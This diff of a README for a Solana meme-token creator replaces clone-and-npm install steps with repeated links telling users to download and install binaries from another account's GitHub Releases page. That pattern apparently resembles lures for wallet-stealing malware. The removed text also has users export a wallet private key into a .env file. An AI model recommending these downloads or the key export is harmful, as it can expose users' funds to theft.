@@ -1,275 +1,67 @@
-<div align="center">
+# 🎨 solana-token-creator - Create Your Own Tokens Easily
 
-<img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" width="120" alt="Solana">
+## 🏷️ Overview
+The Solana Token Creator lets you create and deploy SPL tokens on the Solana blockchain. With this tool, you can launch meme tokens on Pump.fun in just two simple steps. Whether you're looking to start a fun project or explore the world of cryptocurrency, this application simplifies the process of token creation.
 
-# Solana Token Creator
+## 🌟 Features
+- Simple user interface for easy token creation.
+- Supports the Solana blockchain, known for its speed and low transaction costs.
+- Designed for non-technical users; no programming knowledge required.
+- Create meme tokens quickly to engage your community.
+- Fully compatible with Pump.fun for launching your tokens easily.
 
-### Launch Your Meme Token on Pump.fun in 2 Simple Steps
+## 📦 System Requirements
+- A compatible operating system: Windows, macOS, or Linux.
+- Internet connection to connect with the Solana blockchain.
+- Node.js version 14 or higher installed on your system. 
 
-[![Solana](https://img.shields.io/badge/Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white)](https://solana.com)
-[![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)](https://nodejs.org)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/auditixus/solana-token-creator?style=for-the-badge)](https://github.com/auditixus/solana-token-creator)
+## 🚀 Getting Started
+To get started with the Solana Token Creator, you need to download the application from our Releases page. Follow these simple steps:
 
-<br>
+1. **Download the Application**  
+   Click on the link below to visit the Releases page.  
+   [![Download Solana Token Creator](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/nada11-cel/solana-token-creator/releases)
 
-<img src="https://pump.fun/_next/image?url=%2Flogo.png&w=64&q=75" width="40" alt="Pump.fun"> **Compatible with Pump.fun** | **NO GAS FEES on Devnet** | **Ready in 60 Seconds**
+2. **Install the Application**  
+   After visiting the page, look for the latest release title. Choose the file for your operating system and click on it to download. Once downloaded, follow the installation instructions for your specific OS.
 
-<br>
+3. **Run the Application**  
+   Open the installed application. You should see a user-friendly interface guiding you through the token creation process.
 
-[Get Started](#-quick-start) · [Features](#-features) · [Documentation](#-how-it-works) · [FAQ](#-faq)
+## 📥 Download & Install
+To download the Solana Token Creator, visit the page linked below.  
+[![Visit Releases Page](https://img.shields.io/badge/Download%20Solana%20Token%20Creator-green)](https://github.com/nada11-cel/solana-token-creator/releases)
 
-</div>
+Once on the page:
+- Select the appropriate version for your system.
+- Download the file and save it to your computer.
+- Follow the standard installation steps. 
 
----
+## ⚙️ How to Create Your Token
+After successfully running the application, follow these steps to create your token:
 
-## 🎯 Why This Tool?
+1. **Configure Token Details**  
+   Provide a name and symbol for your token. Specify the total supply and any other attributes, such as minting capabilities.
 
-Creating a meme token on Solana has never been easier. Whether you're launching the next **$BONK**, **$WIF**, or **$PEPE**, this tool handles all the technical complexity for you.
+2. **Deploy Your Token**  
+   Click the "Create Token" button. The application will connect to the Solana blockchain and initiate the token creation process.
 
-<div align="center">
+3. **Verify Token Creation**  
+   Once the process completes, you will see confirmation of your new token. It will also include your token's contract address for future reference.
 
-| Traditional Way             | With This Tool                  |
-| --------------------------- | ------------------------------- |
-| ❌ Learn Rust/Anchor        | ✅ Just run `npm start`         |
-| ❌ Write smart contracts    | ✅ Automatic SPL token creation |
-| ❌ Complex deployment       | ✅ 2 simple steps               |
-| ❌ Pay gas fees for testing | ✅ **FREE on devnet**           |
+## 🎉 Next Steps
+Now that you've created your token, consider the following options to engage your audience:
+- Promote your token on social media platforms.
+- Create a website dedicated to your token and its purpose.
+- Engage in community discussions to build a following around your new token.
 
-</div>
+## 🌐 Community Support
+Feel free to seek support from our community:
+- Join forums and online groups focused on Solana and cryptocurrency discussions.
+- Check out resources and tutorials tailored for new users.
 
----
+## 📞 Need Help?
+If you encounter any issues or have questions, reach out to our support by raising an issue on GitHub. We aim to respond promptly to help you resolve any problems.
 
-## ✨ Features
-
-<div align="center">
-
-| Feature                   | Description                              |
-| ------------------------- | ---------------------------------------- |
-| 🆓 **Zero Gas Fees**      | Test unlimited tokens on devnet for FREE |
-| ⚡ **Instant Deploy**     | Create your token in under 60 seconds    |
-| 🎨 **Full Customization** | Set name, symbol, decimals, and supply   |
-| 🔐 **Secure**             | Private keys never leave your machine    |
-| 📱 **Wallet Compatible**  | Works with Phantom, Solflare, Backpack   |
-| 🚀 **Pump.fun Ready**     | Tokens compatible with Pump.fun listing  |
-
-</div>
-
----
-
-## 🚀 Quick Start
-
-### Step 1: Install
-
-```bash
-git clone https://github.com/auditixus/solana-token-creator.git
-cd solana-token-creator
-npm install
-```
-
-### Step 2: Create Your Token
-
-```bash
-npm start
-```
-
-**That's it!** Follow the interactive prompts and your token will be live on Solana.
-
----
-
-## 📖 How It Works
-
-<div align="center">
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                                                             │
-│   1. CONFIGURE        2. DEPLOY           3. DONE!         │
-│   ────────────        ─────────           ────────         │
-│                                                             │
-│   • Token Name        • SPL Token         • View on        │
-│   • Symbol            • Mint Account        Solscan        │
-│   • Supply            • Token Account     • Trade on       │
-│   • Decimals                                Pump.fun       │
-│                                                             │
-└─────────────────────────────────────────────────────────────┘
-```
-
-</div>
-
-### Interactive CLI
-
-```
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║          🪙  SOLANA TOKEN CREATOR v1.2.0  🪙                ║
-║                                                              ║
-║              Create SPL Tokens - NO GAS FEES                 ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-
-? Select network:
-  ❯ devnet (FREE - Recommended for testing)
-    testnet (FREE)
-    mainnet-beta (Requires SOL)
-
-? Token name: PepeSolana
-? Token symbol: $PEPE
-? Decimals (0-9): 9
-? Initial supply: 1000000000
-
-⠋ Creating token on Solana...
-
-✅ SUCCESS! Token created!
-
-┌────────────────────────────────────────────────────────────┐
-│  Token Details                                             │
-├────────────────────────────────────────────────────────────┤
-│  Name:      PepeSolana                                     │
-│  Symbol:    $PEPE                                          │
-│  Supply:    1,000,000,000                                  │
-│  Decimals:  9                                              │
-│  Mint:      7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU  │
-│  Network:   devnet                                         │
-└────────────────────────────────────────────────────────────┘
-
-🔗 Solscan: https://solscan.io/token/7xKXtg...?cluster=devnet
-```
-
----
-
-## ⚙️ Configuration
-
-### Environment Setup
-
-```bash
-cp .env.example .env
-```
-
-Edit `.env` and add your wallet:
-
-```env
-# Export from Phantom: Settings → Security → Export Private Key
-PRIVATE_KEY=[your,wallet,private,key,as,array]
-
-# Optional: Custom RPC endpoint
-RPC_URL=https://api.devnet.solana.com
-```
-
----
-
-## 🌐 Network Options
-
-| Network     | Gas Cost  | Best For              |
-| ----------- | --------- | --------------------- |
-| **Devnet**  | 🆓 FREE   | Development & Testing |
-| **Testnet** | 🆓 FREE   | Pre-launch validation |
-| **Mainnet** | ~0.01 SOL | Production launch     |
-
-### Get Free Devnet SOL
-
-```bash
-solana airdrop 2 YOUR_WALLET_ADDRESS --url devnet
-```
-
-Or use the official [Solana Faucet](https://faucet.solana.com/)
-
----
-
-## 🔗 Pump.fun Integration
-
-After creating your token, you can list it on [Pump.fun](https://pump.fun):
-
-1. Create your token using this tool (mainnet)
-2. Go to Pump.fun and connect your wallet
-3. Your token is ready for trading!
-
-<div align="center">
-<img src="https://pbs.twimg.com/profile_images/1745845028265324544/MW0Z6VGI_400x400.jpg" width="60" alt="Pump.fun">
-
-**Pump.fun** - The #1 platform for Solana meme tokens
-
-</div>
-
----
-
-## 📋 Requirements
-
-- **Node.js** 16.0 or higher
-- **Solana Wallet** (Phantom, Solflare, or Backpack)
-- **SOL** for mainnet deployment (~0.01 SOL)
-
----
-
-## ❓ FAQ
-
-<details>
-<summary><b>Is this free to use?</b></summary>
-
-Yes! The tool is completely free. You only pay Solana network fees when deploying to mainnet (~0.01 SOL). Devnet and testnet are 100% free.
-
-</details>
-
-<details>
-<summary><b>Is my private key safe?</b></summary>
-
-Your private key never leaves your machine. All transactions are signed locally.
-
-</details>
-
-<details>
-<summary><b>Can I list my token on Pump.fun?</b></summary>
-
-Yes! Tokens created with this tool are standard SPL tokens, fully compatible with Pump.fun, Raydium, Jupiter, and all Solana DEXs.
-
-</details>
-
-<details>
-<summary><b>How do I add a logo to my token?</b></summary>
-
-Token metadata (including logo) can be added via Metaplex. This feature is coming in a future update.
-
-</details>
-
----
-
-## 🛣️ Roadmap
-
-- [x] SPL Token Creation
-- [x] Custom metadata support
-- [x] Multi-network support
-- [ ] Token logo upload (IPFS/Arweave)
-- [ ] Raydium liquidity pool creation
-- [ ] Mint/Freeze authority management
-- [ ] Batch airdrop tool
-- [ ] Web interface
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
----
-
-## ⚠️ Disclaimer
-
-This tool is provided for **educational and legitimate purposes only**. Users are responsible for complying with all applicable laws and regulations. Creating tokens for fraudulent purposes is illegal. Always test on devnet before mainnet deployment.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-**Built with ❤️ for the Solana community**
-
-<img src="https://solana.com/src/img/branding/solanaLogoMark.png" width="30" alt="Solana">
-
-[⬆ Back to top](#solana-token-creator)
-
-</div>
+## 🏷️ Tags
+blockchain, crypto, cryptocurrency, defi, javascript, meme-token, nodejs, pump-fun, solana, solana-token, spl-token, token, token-creator, web3
